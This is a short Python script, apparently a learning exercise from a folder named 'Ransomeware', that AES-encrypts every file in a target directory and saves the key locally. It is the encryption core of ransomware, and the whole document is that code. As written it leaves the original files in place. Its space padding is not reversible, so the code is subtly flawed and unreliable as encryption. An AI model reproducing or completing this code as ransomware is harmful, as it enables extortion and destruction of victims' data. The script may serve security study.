import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def encrypt_file(file_path, key):
    chunk_size = 64 * 1024  
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_file_path = file_path + ".encrypted"

    with open(file_path, 'rb') as input_file, open(encrypted_file_path, 'wb') as output_file:
        output_file.write(iv)
        while True:
            chunk = input_file.read(chunk_size)
            if len(chunk) == 0:
                break
            if len(chunk) % 16 != 0:
                chunk += b' ' * (16 - (len(chunk) % 16))
            encrypted_chunk = cipher.encrypt(chunk)
            output_file.write(encrypted_chunk)

def encrypt_folder(folder_path):
    key = get_random_bytes(32)
    for file_name in os.listdir(folder_path):
        file_path = os.path.join(folder_path, file_name)

        if os.path.isfile(file_path):
            encrypt_file(file_path, key)

    with open("encryption_key.bin", 'wb') as key_file:
        key_file.write(key)

# Usage
folder_path = "/home/raz/git/cyber/Ransomeware/tryme"
encrypt_folder(folder_path)

